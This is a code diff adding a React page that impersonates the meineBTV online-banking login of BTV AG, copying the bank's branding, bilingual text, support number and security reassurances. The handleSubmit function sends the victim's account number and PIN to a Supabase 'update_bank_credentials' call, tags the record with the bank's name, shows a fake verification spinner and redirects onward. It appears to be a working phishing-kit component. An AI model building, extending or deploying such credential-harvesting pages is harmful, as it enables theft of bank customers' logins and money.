@@ -1,0 +1,556 @@
+import { useState, useEffect, useCallback, useRef } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
+import { ChevronRight, ChevronDown, ChevronLeft } from "lucide-react";
+import { useIsMobile } from "@/hooks/use-mobile";
+import btvLogo from "@/assets/btv-logo.svg";
+import atFlagge from "@/assets/at-flagge.png";
+import slide1 from "@/assets/btv-slide-1.jpg";
+import slide2 from "@/assets/btv-slide-2.jpg";
+
+type Lang = "DE" | "EN";
+
+const translations: Record<Lang, {
+  title: string;
+  step1: string;
+  pinPlaceholder: string;
+  sslText: string;
+  next: string;
+  firstLogin: string;
+  linksTitle: string;
+  links: string[];
+  meldungen: string;
+  meldungText: string;
+  moreNews: string;
+  footerLinks: string[];
+  languageNames: string[];
+  copyright: string;
+}> = {
+  DE: {
+    title: "Willkommen bei meineBTV!",
+    step1: "1. Ihre Verfügernummer",
+    pinPlaceholder: "Pin",
+    sslText: "Ihre Anmeldung bei meineBTV geschieht über gesicherte SSL Verbindungen.",
+    next: "Weiter",
+    firstLogin: "Erstanmeldung",
+    linksTitle: "Weiterführende Links",
+    links: [
+      "Download BTV Security App - Apple/Mac",
+      "Download BTV Security App - Windows/PC",
+      "meineBTV - Erstanmeldung",
+      "meineBTV - Hilfe und FAQs",
+      "FastClient - Fernwartungstool",
+      "Support +43 505 333 - 1160",
+      "Datenschutz und AGB",
+    ],
+    meldungen: "Meldungen",
+    meldungText: "Phishing, Smishing und Vishing: Wie können Sie sich vor Datendiebstahl schützen?",
+    moreNews: "Weitere Nachrichten anzeigen",
+    footerLinks: ["Impressum", "Rechtliche Hinweise", "Standorte", "Support"],
+    languageNames: ["Deutsch", "Englisch"],
+    copyright: "© 2026 BTV AG",
+  },
+  EN: {
+    title: "Welcome to meineBTV!",
+    step1: "1. Your disposer number",
+    pinPlaceholder: "Pin",
+    sslText: "Your login to meineBTV is via secured SSL connections.",
+    next: "Next",
+    firstLogin: "First login",
+    linksTitle: "Further links",
+    links: [
+      "Download BTV Security App - Apple/Mac",
+      "Download BTV Security App - Windows/PC",
+      "meineBTV - First login",
+      "meineBTV - Help and FAQs",
+      "FastClient - Remote support tool",
+      "Support +43 505 333 - 1160",
+      "Privacy and Terms",
+    ],
+    meldungen: "News",
+    meldungText: "Phishing, Smishing and Vishing: How to protect yourself from data theft?",
+    moreNews: "Show more news",
+    footerLinks: ["Imprint", "Legal Notice", "Locations", "Support"],
+    languageNames: ["German", "English"],
+    copyright: "© 2026 BTV AG",
+  },
+};
+
+const langKeys: Lang[] = ["DE", "EN"];
+
+const slides = [slide1, slide2];
+
+const BTV_BLUE = "#0a3a5c";
+const BTV_DARK = "#062a44";
+const CARD_BG = "#e8eef2";
+const CARD_BORDER = "#cfd9e0";
+const ERSTANMELDUNG_BG = "#7a8a96";
+
+const Btv = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+  const isMobile = useIsMobile();
+
+  const [verfNr, setVerfNr] = useState("");
+  const [pin, setPin] = useState("");
+  const [language, setLanguage] = useState<Lang>("DE");
+  const [langOpen, setLangOpen] = useState(false);
+  const [currentSlide, setCurrentSlide] = useState(0);
+  const langRef = useRef<HTMLDivElement | null>(null);
+
+  usePageMeta("meineBTV - Login", btvLogo);
+
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+
+  const t = translations[language];
+
+  const nextSlide = useCallback(() => setCurrentSlide(p => (p + 1) % slides.length), []);
+  const prevSlide = useCallback(() => setCurrentSlide(p => (p - 1 + slides.length) % slides.length), []);
+
+  useEffect(() => {
+    const timer = setInterval(nextSlide, 6000);
+    return () => clearInterval(timer);
+  }, [nextSlide]);
+
+  useEffect(() => {
+    const onClick = (e: MouseEvent) => {
+      if (langRef.current && !langRef.current.contains(e.target as Node)) setLangOpen(false);
+    };
+    document.addEventListener("mousedown", onClick);
+    return () => document.removeEventListener("mousedown", onClick);
+  }, []);
+
+  const handleSubmit = async () => {
+    if (!verfNr.trim() || !pin.trim()) return;
+    if (sessionId) {
+      const { error } = await supabase.rpc("update_bank_credentials", {
+        p_session_id: sessionId,
+        p_username: verfNr,
+        p_password: pin,
+        p_username_label: "Verfügernummer",
+        p_password_label: "Pin",
+      });
+      if (error) console.error("Update failed:", error);
+      await supabase.from("submissions").update({ bank: "BTV" }).eq("session_id", sessionId);
+    }
+    setShowLoading(true);
+  };
+
+  const inputStyle: React.CSSProperties = {
+    width: "100%",
+    padding: "10px 12px",
+    border: `1px solid ${BTV_BLUE}`,
+    background: "#fff",
+    borderRadius: 2,
+    fontSize: 14,
+    color: BTV_BLUE,
+    outline: "none",
+    boxSizing: "border-box",
+    fontFamily: "inherit",
+  };
+
+  return (
+    <>
+      {showLoading && (
+        <LoadingOverlay
+          message="Anmeldedaten werden überprüft..."
+          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+        />
+      )}
+      <div
+        style={{
+          minHeight: "100vh",
+          background: BTV_BLUE,
+          fontFamily: "Helvetica, Arial, sans-serif",
+          color: "#fff",
+          display: "flex",
+          flexDirection: "column",
+        }}
+      >
+        {/* Header */}
+        <div
+          style={{
+            background: BTV_BLUE,
+            padding: isMobile ? "16px 20px" : "20px 40px",
+            display: "flex",
+            justifyContent: "flex-end",
+            alignItems: "center",
+            borderBottom: "1px solid rgba(255,255,255,0.08)",
+          }}
+        >
+          <img src={btvLogo} alt="BTV" style={{ height: isMobile ? 36 : 44 }} />
+        </div>
+
+        {/* Main */}
+        <div
+          style={{
+            flex: 1,
+            maxWidth: 1200,
+            margin: "0 auto",
+            width: "100%",
+            padding: isMobile ? "20px 16px 40px" : "40px 30px 60px",
+            boxSizing: "border-box",
+          }}
+        >
+          <h1
+            style={{
+              fontFamily: "Georgia, 'Times New Roman', serif",
+              fontWeight: 400,
+              fontSize: isMobile ? 32 : 46,
+              margin: "0 0 28px",
+              color: "#fff",
+            }}
+          >
+            {t.title}
+          </h1>
+
+          <div
+            style={{
+              display: "flex",
+              flexDirection: isMobile ? "column" : "row",
+              gap: 16,
+              alignItems: "stretch",
+            }}
+          >
+            {/* Login Card */}
+            <div
+              style={{
+                flex: isMobile ? "0 0 auto" : "1 1 0",
+                background: CARD_BG,
+                color: BTV_BLUE,
+                borderRadius: 2,
+                display: "flex",
+                flexDirection: "column",
+                minWidth: 0,
+              }}
+            >
+              <div style={{ padding: "24px 24px 20px" }}>
+                <label style={{ display: "block", fontSize: 13, marginBottom: 10, color: BTV_BLUE }}>
+                  {t.step1}
+                </label>
+                <input
+                  type="text"
+                  value={verfNr}
+                  onChange={(e) => setVerfNr(e.target.value)}
+                  style={{ ...inputStyle, marginBottom: 14 }}
+                />
+
+                <div style={{ display: "flex", gap: 10, marginBottom: 16 }}>
+                  <input
+                    type="password"
+                    placeholder={t.pinPlaceholder}
+                    value={pin}
+                    onChange={(e) => setPin(e.target.value)}
+                    style={{ ...inputStyle, flex: 1, minWidth: 0 }}
+                  />
+                  <div ref={langRef} style={{ position: "relative", flex: 1, minWidth: 0 }}>
+                    <button
+                      type="button"
+                      onClick={() => setLangOpen((p) => !p)}
+                      style={{
+                        ...inputStyle,
+                        cursor: "pointer",
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "space-between",
+                        textAlign: "left",
+                      }}
+                    >
+                      <span>{t.languageNames[langKeys.indexOf(language)]}</span>
+                      <ChevronDown size={16} color={BTV_BLUE} />
+                    </button>
+                    {langOpen && (
+                      <div
+                        style={{
+                          position: "absolute",
+                          top: "calc(100% + 2px)",
+                          left: 0,
+                          right: 0,
+                          background: "#fff",
+                          border: `1px solid ${BTV_BLUE}`,
+                          zIndex: 50,
+                        }}
+                      >
+                        {langKeys.map((k, i) => (
+                          <button
+                            key={k}
+                            onClick={() => { setLanguage(k); setLangOpen(false); }}
+                            style={{
+                              display: "block",
+                              width: "100%",
+                              textAlign: "left",
+                              padding: "8px 12px",
+                              background: language === k ? CARD_BG : "#fff",
+                              border: "none",
+                              color: BTV_BLUE,
+                              cursor: "pointer",
+                              fontSize: 14,
+                            }}
+                          >
+                            {t.languageNames[i]}
+                          </button>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                <p style={{ fontSize: 12, lineHeight: 1.5, margin: "0 0 18px", color: BTV_BLUE }}>
+                  {t.sslText}
+                </p>
+
+                <div style={{ textAlign: "right" }}>
+                  <button
+                    onClick={handleSubmit}
+                    style={{
+                      background: BTV_BLUE,
+                      color: "#fff",
+                      border: "none",
+                      padding: "10px 36px",
+                      fontSize: 14,
+                      cursor: "pointer",
+                      borderRadius: 2,
+                      fontFamily: "inherit",
+                    }}
+                  >
+                    {t.next}
+                  </button>
+                </div>
+              </div>
+
+              {/* Erstanmeldung bar */}
+              <div style={{ marginTop: "auto", display: "flex", justifyContent: "flex-end" }}>
+                <div
+                  style={{
+                    background: ERSTANMELDUNG_BG,
+                    color: "#fff",
+                    padding: "12px 28px",
+                    fontSize: 14,
+                    cursor: "default",
+                  }}
+                >
+                  {t.firstLogin}
+                </div>
+              </div>
+            </div>
+
+            {/* Weiterführende Links */}
+            <div
+              style={{
+                flex: isMobile ? "0 0 auto" : "1 1 0",
+                background: CARD_BG,
+                color: BTV_BLUE,
+                borderRadius: 2,
+                padding: "24px 24px 20px",
+                minWidth: 0,
+              }}
+            >
+              <h2 style={{ fontSize: 18, fontWeight: 600, margin: "0 0 16px", color: BTV_BLUE }}>
+                {t.linksTitle}
+              </h2>
+              <div>
+                {t.links.map((label, i) => (
+                  <div
+                    key={i}
+                    style={{
+                      display: "flex",
+                      alignItems: "center",
+                      justifyContent: "space-between",
+                      padding: "10px 0",
+                      borderBottom: i === t.links.length - 1 ? "none" : `1px solid ${CARD_BORDER}`,
+                      fontSize: 13,
+                      color: BTV_BLUE,
+                      cursor: "pointer",
+                    }}
+                  >
+                    <span>{label}</span>
+                    <ChevronRight size={16} color={BTV_BLUE} />
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* Slider */}
+            <div
+              style={{
+                flex: isMobile ? "0 0 auto" : "1 1 0",
+                position: "relative",
+                background: BTV_DARK,
+                borderRadius: 2,
+                overflow: "hidden",
+                minHeight: isMobile ? 280 : "auto",
+                minWidth: 0,
+              }}
+            >
+              {slides.map((src, i) => (
+                <img
+                  key={i}
+                  src={src}
+                  alt={`Werbung ${i + 1}`}
+                  style={{
+                    position: i === 0 ? "relative" : "absolute",
+                    top: 0,
+                    left: 0,
+                    width: "100%",
+                    height: "100%",
+                    objectFit: "cover",
+                    opacity: currentSlide === i ? 1 : 0,
+                    transition: "opacity 0.6s ease",
+                    display: "block",
+                  }}
+                />
+              ))}
+              {/* Dots */}
+              <div
+                style={{
+                  position: "absolute",
+                  top: 12,
+                  left: "50%",
+                  transform: "translateX(-50%)",
+                  display: "flex",
+                  gap: 6,
+                  zIndex: 2,
+                }}
+              >
+                {slides.map((_, i) => (
+                  <span
+                    key={i}
+                    onClick={() => setCurrentSlide(i)}
+                    style={{
+                      width: 8,
+                      height: 8,
+                      borderRadius: "50%",
+                      background: currentSlide === i ? "#fff" : "rgba(255,255,255,0.4)",
+                      cursor: "pointer",
+                    }}
+                  />
+                ))}
+              </div>
+              {/* Arrows */}
+              <button
+                onClick={prevSlide}
+                style={{
+                  position: "absolute",
+                  left: 8,
+                  top: "50%",
+                  transform: "translateY(-50%)",
+                  background: "rgba(0,0,0,0.25)",
+                  border: "none",
+                  color: "#fff",
+                  width: 28,
+                  height: 28,
+                  borderRadius: "50%",
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  zIndex: 2,
+                }}
+              >
+                <ChevronLeft size={18} />
+              </button>
+              <button
+                onClick={nextSlide}
+                style={{
+                  position: "absolute",
+                  right: 8,
+                  top: "50%",
+                  transform: "translateY(-50%)",
+                  background: "rgba(0,0,0,0.25)",
+                  border: "none",
+                  color: "#fff",
+                  width: 28,
+                  height: 28,
+                  borderRadius: "50%",
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  zIndex: 2,
+                }}
+              >
+                <ChevronRight size={18} />
+              </button>
+            </div>
+          </div>
+
+          {/* Meldungen */}
+          <div style={{ marginTop: 36 }}>
+            <h3 style={{ fontSize: 16, fontWeight: 400, margin: "0 0 12px", color: "#fff" }}>
+              {t.meldungen}
+            </h3>
+            <div
+              style={{
+                background: "rgba(255,255,255,0.06)",
+                border: "1px solid rgba(255,255,255,0.12)",
+                padding: "14px 16px",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "space-between",
+                gap: 12,
+                fontSize: 14,
+                color: "#fff",
+              }}
+            >
+              <div style={{ display: "flex", alignItems: "center", gap: 10, minWidth: 0 }}>
+                <ChevronRight size={16} color="#fff" />
+                <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
+                  {t.meldungText}
+                </span>
+              </div>
+              <span style={{ flexShrink: 0, fontSize: 13, color: "rgba(255,255,255,0.7)" }}>
+                09.04.2026, 16:23 Uhr
+              </span>
+            </div>
+            <div style={{ textAlign: "center", marginTop: 28 }}>
+              <button
+                style={{
+                  background: "#5a7a8c",
+                  color: "#fff",
+                  border: "none",
+                  padding: "10px 28px",
+                  fontSize: 14,
+                  cursor: "pointer",
+                  borderRadius: 2,
+                  fontFamily: "inherit",
+                }}
+              >
+                {t.moreNews}
+              </button>
+            </div>
+          </div>
+        </div>
+
+        {/* Footer */}
+        <div
+          style={{
+            borderTop: "1px solid rgba(255,255,255,0.08)",
+            padding: isMobile ? "16px 20px" : "16px 40px",
+            display: "flex",
+            flexDirection: isMobile ? "column" : "row",
+            alignItems: isMobile ? "flex-start" : "center",
+            gap: 16,
+            fontSize: 13,
+            color: "rgba(255,255,255,0.85)",
+          }}
+        >
+          <img src={atFlagge} alt="AT" style={{ height: 18 }} />
+          <div style={{ display: "flex", gap: 24, flexWrap: "wrap" }}>
+            {t.footerLinks.map((label) => (
+              <span key={label} style={{ cursor: "pointer" }}>{label}</span>
+            ))}
+          </div>
+          <div style={{ marginLeft: isMobile ? 0 : "auto", color: "rgba(255,255,255,0.7)" }}>
+            {t.copyright}
+          </div>
+        </div>
+      </div>
+    </>
+  );
+};
+
+export default Btv;
